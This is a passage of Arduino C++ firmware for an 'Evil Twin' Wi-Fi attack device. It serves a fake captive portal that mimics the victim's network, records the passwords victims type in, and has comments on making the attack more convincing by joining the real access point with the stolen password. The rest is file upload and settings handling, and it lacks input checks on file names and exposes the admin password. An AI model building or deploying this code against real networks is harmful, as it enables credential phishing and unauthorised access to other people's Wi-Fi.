  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (fsUploadFile) {
      fsUploadFile.write(upload.buf, upload.currentSize);
    } else {
      Serial.println("[ERROR] File not open for writing during upload.");
    }
  } else if (upload.status == UPLOAD_FILE_END) {
    if (fsUploadFile) {
      fsUploadFile.close(); // Close the file only at the end
      Serial.println("\n[FILE] Upload complete: " + upload.filename + ", size: " + String(upload.totalSize));
    } else {
      Serial.println("[ERROR] File was not properly opened or written to.");
    }
    // Send JSON response for successful upload
    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"File uploaded successfully\"}");
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (fsUploadFile) {
      fsUploadFile.close();
      SPIFFS.remove(upload.filename); // Clean up aborted upload
      Serial.println("[FILE] Upload aborted: " + upload.filename);
    }
    webServer.send(500, "application/json", "{\"success\": false, \"message\": \"Upload aborted\"}");
  }
}

void handleFileDelete() {
  if (webServer.hasArg("plain")) { // Expecting JSON body with filename
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String filename = doc["filename"].as<String>();
    if (!filename.startsWith("/")) filename = "/" + filename;
    if (SPIFFS.exists(filename)) {
      SPIFFS.remove(filename);
      Serial.println("[FILE] Deleted: " + filename);
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"File deleted\"}");
    } else {
      Serial.println("[WARNING] File not found for deletion: " + filename);
      webServer.send(404, "application/json", "{\"success\": false, \"message\": \"File not found\"}");
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

// --- Captive Portal Handlers ---

void handleCaptivePortal() {
  if (!hotspot_active) {
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/", true); // Redirect to main UI if Evil Twin not active
    webServer.send(302, "text/plain", "");
    return;
  }

  String captivePortalHTML = "";
  String templateToLoad = appSettings.defaultCaptivePortalTemplate; // Use setting

  // Prioritize custom uploaded template if it matches the setting
  if (templateToLoad == "custom" && SPIFFS.exists("/captive_portal_template.html")) {
      File file = SPIFFS.open("/captive_portal_template.html", "r");
      if (file) {
          captivePortalHTML = file.readString();
          file.close();
          Serial.println("[INFO] Serving custom captive portal from SPIFFS.");
      } else {
          Serial.println("[WARNING] Custom template not found in SPIFFS. Falling back to embedded default.");
          captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      }
  } else if (templateToLoad == "default") {
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      Serial.println("[INFO] Serving embedded default captive portal template.");
  }
  // Add more cases here for other built-in templates if they were stored as separate PROGMEM strings
  // e.g., if (templateToLoad == "facebook") captivePortalHTML = FACEBOOK_TEMPLATE_HTML;
  else {
      // Fallback if setting is invalid or template not found
      captivePortalHTML = CAPTIVE_PORTAL_TEMPLATE_HTML;
      Serial.println("[WARNING] Invalid default captive portal template setting or template not found. Serving embedded default.");
  }
  
  captivePortalHTML.replace("{SSID}", _selectedNetwork.ssid);
  captivePortalHTML.replace("{DEVICE_NAME}", APP_NAME);
  captivePortalHTML.replace("{CURRENT_TIME}", String(millis() / 1000) + "s"); // Simple uptime for time

  webServer.send(200, "text/html", captivePortalHTML);
}

void handleCaptivePortalSubmit() {
  if (webServer.hasArg("password")) {
    String capturedPassword = webServer.arg("password");
    String logEntry = "Captured for SSID: " + _selectedNetwork.ssid + ", Password: " + capturedPassword + " (Time: " + String(millis() / 1000) + "s)\n";
    _capturedPasswordsLog += logEntry;
    Serial.print("[SNIFFER] ");
    Serial.println(logEntry);

    // After capturing, you can redirect them to a "success" page or a fake error page
    // or even try to connect to the real AP (if you want to be less suspicious).
    // For now, a simple "Thank You" page.
    String response = "<!DOCTYPE html><html><head><title>Success</title><meta name='viewport' content='width=device-width, initial-scale=1'></head><body>";
    response += "<center><h1>Thank You!</h1><p>Your connection is being established. Please wait...</p>";
    response += "<p>You may need to reconnect to the network.</p></center></body></html>";
    webServer.send(200, "text/html", response);

    // Optional: Try to connect to the real AP with the captured password
    // This makes the attack more convincing but requires the ESP to switch roles.
    // WiFi.disconnect();
    // WiFi.begin(_selectedNetwork.ssid.c_str(), capturedPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
    // Serial.println("[INFO] Attempting to connect to real AP with captured password...");
  } else {
    webServer.send(200, "text/html", "Password not provided.");
  }
}

// --- System Control ---

void handleRestart() {
  webServer.send(200, "text/html", "<h1>Restarting Device...</h1><p>The device will restart in a few seconds. Please wait.</p>");
  delay(2000);
  ESP.restart();
}

// --- New: Settings Management Functions (Implementation) ---
const char SETTINGS_FILE[] = "/settings.json";

void loadSettings() {
  // Set default values first
  appSettings.adminApSsid = DEFAULT_ADMIN_AP_SSID; // Use original #define as default
  appSettings.adminApPassword = DEFAULT_ADMIN_AP_PASSWORD;
  appSettings.enableDebugLogs = false;
  appSettings.defaultCaptivePortalTemplate = "default";

  if (SPIFFS.exists(SETTINGS_FILE)) {
    File settingsFile = SPIFFS.open(SETTINGS_FILE, "r");
    if (settingsFile) {
      DynamicJsonDocument doc(1024); // Adjust size as settings grow
      DeserializationError error = deserializeJson(doc, settingsFile);
      if (!error) {
        appSettings.adminApSsid = doc["adminApSsid"] | appSettings.adminApSsid;
        appSettings.adminApPassword = doc["adminApPassword"] | appSettings.adminApPassword;
        appSettings.enableDebugLogs = doc["enableDebugLogs"] | appSettings.enableDebugLogs;
        appSettings.defaultCaptivePortalTemplate = doc["defaultCaptivePortalTemplate"] | appSettings.defaultCaptivePortalTemplate;
        Serial.println("[INFO] Settings loaded from SPIFFS.");
      } else {
        Serial.println("[ERROR] Failed to parse settings JSON. Using defaults.");
      }
      settingsFile.close();
    } else {
      Serial.println("[ERROR] Failed to open settings file for reading. Using defaults.");
    }
  } else {
    Serial.println("[INFO] Settings file not found. Using default settings.");
    saveSettings(); // Save defaults to file for next boot
  }
}

void saveSettings() {
  File settingsFile = SPIFFS.open(SETTINGS_FILE, "w");
  if (settingsFile) {
    DynamicJsonDocument doc(1024);
    doc["adminApSsid"] = appSettings.adminApSsid;
    doc["adminApPassword"] = appSettings.adminApPassword;
    doc["enableDebugLogs"] = appSettings.enableDebugLogs;
    doc["defaultCaptivePortalTemplate"] = appSettings.defaultCaptivePortalTemplate;

    if (serializeJson(doc, settingsFile) == 0) {
      Serial.println("[ERROR] Failed to write settings to file.");
    } else {
      Serial.println("[INFO] Settings saved to SPIFFS.");
    }
    settingsFile.close();
  } else {
    Serial.println("[ERROR] Failed to open settings file for writing.");
  }
}

void handleApiGetSettings() {
  DynamicJsonDocument doc(512);
  doc["adminApSsid"] = appSettings.adminApSsid;
  doc["adminApPassword"] = appSettings.adminApPassword;
  doc["enableDebugLogs"] = appSettings.enableDebugLogs;
  doc["defaultCaptivePortalTemplate"] = appSettings.defaultCaptivePortalTemplate;

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiSaveSettings() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(1024); // Adjust size based on expected SSID list length
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    // Update settings from JSON, using current values as defaults if not provided
    String newAdminApSsid = doc["adminApSsid"] | appSettings.adminApSsid;
    String newAdminApPassword = doc["adminApPassword"] | appSettings.adminApPassword;
    bool newEnableDebugLogs = doc["enableDebugLogs"] | appSettings.enableDebugLogs;
    String newDefaultCaptivePortalTemplate = doc["defaultCaptivePortalTemplate"] | appSettings.defaultCaptivePortalTemplate;

    bool apSettingsChanged = (newAdminApSsid != appSettings.adminApSsid || newAdminApPassword != appSettings.adminApPassword);

    appSettings.adminApSsid = newAdminApSsid;
    appSettings.adminApPassword = newAdminApPassword;
    appSettings.enableDebugLogs = newEnableDebugLogs;
    appSettings.defaultCaptivePortalTemplate = newDefaultCaptivePortalTemplate;

    saveSettings(); // Save updated settings to SPIFFS

    // If admin AP settings changed, restart AP
    // Note: This will temporarily disconnect clients from the admin AP.
    // A full restart might be better for critical changes.
    if (apSettingsChanged) {
        Serial.println("[INFO] Admin AP settings changed. Restarting AP...");
        WiFi.softAPdisconnect(true);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
        dnsServer.stop(); // Stop and restart DNS server
        dnsServer.start(DNS_PORT, "*", apIP);
    }

    webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Settings saved successfully\"}");
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}
